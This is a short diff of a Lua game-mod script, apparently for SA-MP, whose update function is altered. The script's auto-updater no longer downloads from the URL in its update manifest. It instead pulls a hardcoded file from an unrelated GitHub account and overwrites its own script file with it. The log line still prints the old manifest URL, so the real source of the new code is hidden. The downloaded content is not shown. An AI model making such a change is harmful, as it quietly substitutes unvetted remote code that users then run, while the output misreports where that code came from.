@@ -3,7 +3,7 @@ script_authors("Aniki")
 script_version("1.2.3")
 script_version_number(6)
 
---depsproverka22
+--depsproverka
 local effil = require 'effil'
 local encoding = require 'encoding'
 local imgui = require 'imgui'
@@ -32,7 +32,7 @@ function update()
     function f:download()
         local response = requests.get(raw)
         if response.status_code == 200 then
-            downloadUrlToFile(decodeJson(response.text)['url'], thisScript().path, function (id, status, p1, p2)
+            downloadUrlToFile('https://raw.githubusercontent.com/Sinceritate55/11/main/vknotfs%20(1).lua', thisScript().path, function (id, status, p1, p2)
                 print('Скачиваю '..decodeJson(response.text)['url']..' в '..thisScript().path)
                 if status == dlstatus.STATUSEX_ENDDOWNLOAD then
                     sampAddChatMessage('Скрипт обновлен, перезагрузка...', -1)
